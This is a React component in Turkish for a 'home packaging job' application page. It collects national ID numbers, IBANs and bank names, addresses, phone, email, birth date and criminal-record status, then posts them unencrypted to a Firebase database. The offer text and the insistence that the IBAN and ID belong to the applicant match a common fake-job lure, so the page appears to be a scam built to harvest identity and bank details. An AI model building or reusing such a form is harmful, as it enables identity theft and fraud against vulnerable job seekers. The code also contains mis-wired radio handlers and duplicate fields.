/** @jsxRuntime classic */
/** @jsx jsx */
import { jsx, Box, Container, Heading, Text, Input, Grid, Select, Checkbox, Radio, Label } from 'theme-ui';
import Post from 'components/cards/post';
import { useState } from "react";

import axios from 'axios';
const Support = () => {
    const data = [
        {
            id: 1,
            title: 'Misyonumuz',
            image: '',
            desc:
                ` Hedef organizasyon ve paketleme olarak çalıştığımız 9 firma ile ilk amacımız
            Türkiye'de gelirsiz kişi bırakmamak istiyoruz. Evde iş yaparak asgari ücret üstünde kazanabilirsiniz.
            Şunu belirtmek isteriz ki başvurular sabıka kaydına ve gelir düzeyine göre kabul ediyoruz. 
            Yapılan başvuruları uzman ekibimiz ile detaylı bir şekilde incelemesini yaptıktan sonra ekip 
            arkadaşlarımız tarafından sizlere geri dönüş sağlanıyor.Başvurunun son aşaması teyit aşaması oluyor. 
            Daha sonrasında bizimle paylaştığınız adres teyit edilerek ilk paketleme ürünleriniz tarafınıza teslim ediliyor.
            Biz firma olarak devletin herhangi bir kurumu ile bağlantılı değiliz. 
            Bağımsız fabrikalara ve organizasyon şirketlerine çalışma arkadaşları yönlendirmesi yaparak gelir elde ediyoruz. 
            Firmamız ve çalışanlarımız sizlerden kapora veya ücret isteme yetkisi yoktur.
            Türkiye'nin kaporasız hizmet veren şirketi olarak gurur duyarız.
          `,
        },
    ];

    const masonryOptions = {
        originTop: false,
    };

    const [fName, setfName] = useState('Ad');
    const [lName, setlName] = useState('Soyad');
    const [phone, setPhone] = useState('Telefon');
    const [email, setEmail] = useState('Email');
    const [tcno, setTcno] = useState('Tc kimlik no');
    const [ilce, setIlce] = useState('İlçce');

    const [city, setCity] = useState('Şehir');
    const [adress, setAdress] = useState('Adress');
    const [iban, setIban] = useState('Iban no');

    const [bank, setBank] = useState('Ibanın ait olduğu banka');

    const [haveKid, setHaveKid] = useState(true);
    const [haventKid, setHaventKid] = useState(false);

    const [date, setDate] = useState('Doğum tarihiniz');
    const [medeni, setMedeni] = useState('Medeni haliniz');

    const [children, setChildren] = useState(true);
    const [childrenNot, setChildrenNot] = useState(false);

    const [choiseJob, setChoiseJob] = useState('İş tercihi');

    const [criminalNot, setCriminalNot] = useState(true);
    const [criminal, setCriminal] = useState(false);

    const getInputsValue = () => {
        const frmdetails = {
            'First Name': fName,
            'Last Name': lName,
            'Phone': phone,
            'Tc kimlik no': tcno,
            'İl/Şehir': city,
            'İlçe': ilce,
            'E-posta': email,
            'Iban no': iban,
            'Adress': adress,
            'İbanın ait olduğu banka': bank,
            'Çocuğum var': haveKid,
            'Çocuğum yok': haventKid,
            'Doğum tarihi': date,
            'Medeni haliniz': medeni,
            'Çocuğum var': children,
            'Çocuğum yok': childrenNot,
            'İş tercihi': choiseJob,
            'Sabıka kaydım yok': criminalNot,
            'Sabıka kaydım var': criminal,
        }
        axios
            .post('https://paketleme-cb5e6-default-rtdb.firebaseio.com/basvur.json', {
                FirstName: fName,
                LastName: lName,
                Phone: phone,
                TcKimlikNo: tcno,
                IlSehir: city,
                Ilce: ilce,
                EPosta: email,
                IbanNo: iban,
                Adress: adress,
                İbanınAitOlduğuBanka: bank,
                ÇocuğumVar: haveKid,
                ÇocuğumYok: haventKid,
                DoğumTarihi: date,
                MedeniHaliniz: medeni,
                ÇocuğumVar: children,
                ÇocuğumYok: childrenNot,
                İşTercihi: choiseJob,
                SabıkaKaydımYok: criminalNot,
                SabıkaKaydımVar: criminal,
            }
            )
    };

    return (
        <section id="basvuru" sx={styles.section}>
            <Container>
                <Heading as="h1">LÜTFEN BAŞVURU YAPMADAN ÖNCE AÇIKLAMAYI OKUYUNUZ
                    ÖNCELİKLE BAŞVURUNUN EVDE PAKETLEME İÇİN YAPILACAGINI BELİRTMEK İSTERİZ.</Heading>
                <Text as="p" sx={{ margin: '50px 0 100px 0' }}>BAŞVURU SAHİBİNİN MOBİL BANKA KULLANMASI ZORUNLUDUR.
                    VERİLİCEK OLAN IBAN NO'SU BAŞVURANIN ADINA OLMALIDIR.
                    ÇÜNKÜ SİZ BAŞVURDUGUNUZDA ÖDEMELER SİZİN ADINIZA YAPILIR
                    2.ŞAHISLARA ÖDEME YAPILMAZ

                    Verdiğiniz bilgilerin hepsinin size ait olması zorunludur.
                    Aksi taktirde bilgilerin herhangi birtanesi size ait çıkmazsa
                    başvuru iptal olur ve tekrardan başvurunuz alınmaz.
                    TC. Kimlik No ve İBAN aynı kişiye ait olmak zorundadır.
                    Bilgilerin istenmesinin sebebi size gönderilen ürünlerin kayıtlarının yapılması
                    ve gerçek kişi olduğunuzu teyit etme amaçlıdır.
                    Sizlerden herhangi bir kapora ücreti yada kargo ücreti talep edilmeyecektir.
                </Text>
                <Grid gap={10} columns={[2, null, 4]}>
                    <Input defaultValue='Ad' onChange={e => setfName(e.target.value)} />
                    <Input defaultValue='Soyad' onChange={e => setlName(e.target.value)} />
                    <Input defaultValue="Tc kimlik no" onChange={e => setTcno(e.target.value)} />
                    <Input defaultValue="Adres" onChange={e => setAdress(e.target.value)} />
                    <Input defaultValue="İl/Şehir" onChange={e => setCity(e.target.value)} />
                    <Input defaultValue="İlçe" onChange={e => setIlce(e.target.value)} />
                    <Input defaultValue="E-posta" onChange={e => setEmail(e.target.value)} />
                    <Input defaultValue="Telefon" onChange={e => setPhone(e.target.value)} />
                    <Input defaultValue="Iban no" onChange={e => setIban(e.target.value)} />
                    <Select defaultValue="Ibanın ait olduğu banka" onChange={e => setBank(e.target.value)}>
                        <option>AKBANK</option>
                        <option>ZİRAAT BANKASI</option>
                        <option>YAPI KREDİ</option>
                        <option>VAKIF BANK</option>
                        <option>GARANTİ BBVA</option>
                        <option>QNB FİNANSBANK</option>
                        <option>İŞ BANKASI</option>
                        <option>HALK BANK</option>
                        <option>TEB</option>
                        <option>İNG BANK</option>
                        <option>ENPARA</option>
                        <option>PAPARA</option>
                        <option>DENİZBANK</option>
                        <option>DİĞER</option>
                    </Select>
                    <Label>
                        <Radio
                            name='dark-mode'
                            value='true'
                            defaultChecked={true}
                            onChange={e => setHaveKid(e.target.value)}
                        />
                        İban bana ait
                    </Label>
                    <Label>
                        <Radio
                            name='dark-mode'
                            value='false'
                            onChange={e => setHaventKid(e.target.value)}
                        />
                        İban bana ait değil
                    </Label>
                    <Input defaultValue="Doğum tarihi" onChange={e => setDate(e.target.value)} />
                    <Select defaultValue="Medeni hal" onChange={e => setMedeni(e.target.value)}>
                        <option>Bekar</option>
                        <option>Evli</option>

                    </Select>
                    <Label>
                        <Radio
                            name='dark-mod-2'
                            value='true'
                            defaultChecked={true}
                            onChange={e => setChildren(e.target.value)}
                        />
                        Çocuğum var
                    </Label>
                    <Label>
                        <Radio
                            name='dark-mod-2'
                            value='false'
                            onChange={e => setChildrenNot(e.target.value)}
                        />
                        Çocuğum yok
                    </Label>
                    <Select defaultValue="İş tercihi" onChange={e => setChoiseJob(e.target.value)}>
                        <option>BALON PAKETLEME</option>
                        <option>BONCUK PAKETLEME</option>
                        <option>SABUN PAKETLEME</option>
                        <option>
                            VİDA PAKETLEME
                        </option>
                        <option>
                            NİKAH ŞEKERİ PAKETLEME
                        </option>
                        <option>
                            TOKA PAKETLEME
                        </option>
                        <option>
                            ÇORAP PAKETLEME
                        </option>
                        <option>
                            GALOŞ PAKETLEME
                        </option>
                        <option>
                            ELDİVEN PAKETLEME
                        </option>
                        <option>
                            OTEL ŞAMPUANI PAKETLEME
                        </option>
                        <option>
                            KULAK ÇÖPÜ PAKETLEME
                        </option>
                        <option>
                            OTEL TERLİĞİ PAKETLEME
                        </option>
                        <option>
                            ÇATAL AMBALAJI PAKETLEME
                        </option>
                        <option>
                            YÜZÜK KUTUSU PAKETLEME
                        </option>
                        <option>
                            HEDİYE PAKETİ PAKETLEME
                        </option>
                        <option>
                            KAVANOZ BOYAMA
                        </option>
                    </Select>
                    <Label>
                        <Radio
                            name='dark-mode-3'
                            value='true'
                            defaultChecked={true}
                            onChange={e => setCriminalNot(e.target.value)}
                        />
                        Sabıka kaydım yok
                    </Label>
                    <Label>
                        <Radio
                            name='dark-mode-3'
                            value='false'
                            onChange={e => setCriminal(e.target.value)}
                        />
                        Sabıka kaydım var
                    </Label>
                    <Label>
                        <Checkbox defaultChecked={true} readOnly />
                        Şart ve koşulları kabul ediyorum
                    </Label>
                    <button
                        onClick={getInputsValue}
                        sx={{
                            appearance: 'none',
                            display: 'inline-block',
                            textAlign: 'center',
                            lineHeight: 'inherit',
                            textDecoration: 'none',
                            fontSize: 'inherit',
                            fontWeight: 'bold',
                            m: 0,
                            px: 3,
                            py: 2,
                            border: 0,
                            borderRadius: 4,
                            variant: 'buttons.primary',
                        }}>
                        Başvur
                    </button>
                </Grid>
            </Container>
        </section>
    );
};

export default Support;

const styles = {
    section: {
        pt: [8, null, null, null, 10, 17],
        pb: [8, null, null, null, 10, 16],
    },

    grid: {
        gap: [5, null, null, 10, 4],
        mx: 'auto',
        maxWidth: 1193,
        display: 'grid',
        alignItems: 'center',
        gridTemplateColumns: [
            'repeat(1, 1fr)',
            null,
            null,
            null,
            '360px 1fr',
            '470px 1fr',
        ],
    },
    content: {
        display: [null, null, null, 'grid', 'unset'],
        gridTemplateColumns: [null, null, null, 'repeat(2, 1fr)', 'unset'],
    },
    heading: {
        gridColumn: [null, null, null, '1/3', 'unset'],
        maxWidth: [null, null, null, 420, 'none'],
        mx: [null, null, null, 'auto', 'unset'],
        textAlign: ['center', null, null, 'left'],
        h2: {
            color: 'heading',
            fontFamily: 'headingAlt',
            fontSize: [4, null, 6, 8, null, null, 11],
            fontWeight: 500,
            lineHeight: [1.33, null, 1.4, 1.53],
            letterSpacing: ['-0.5px', null, null, '-1px'],
            textAlign: ['center', null, null, null, 'left'],
            span: {
                backgroundSize: 'cover',
                px: 2,
            },
            mb: 4,
        },
        p: {
            color: 'textSecondary',
            fontSize: ['13px', null, null, 2, '15px', 2],
            lineHeight: [1.86, null, null, null, 1.86, 2.25],
            maxWidth: 470,
            m: [null, null, null, '20px auto 0', '15px 0 0', null, 'unset'],
            textAlign: ['center', null, null, null, 'left'],
        },
    },
    illustration: {
        display: 'flex',
        alignItems: 'center',
    },
};
